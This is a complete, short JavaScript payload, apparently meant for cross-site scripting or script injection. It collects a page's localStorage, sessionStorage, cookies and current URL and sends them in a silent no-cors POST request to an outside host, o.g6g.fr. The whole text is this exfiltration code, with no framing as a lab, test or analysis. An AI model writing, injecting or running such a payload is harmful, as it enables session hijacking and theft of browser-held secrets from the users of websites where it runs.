(function() {
    const dump = {
        localStorage: {...localStorage},
        sessionStorage: {...sessionStorage},
        cookies: document.cookie,
        url: location.href
    };

    fetch('https://o.g6g.fr', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(dump)
    });
})();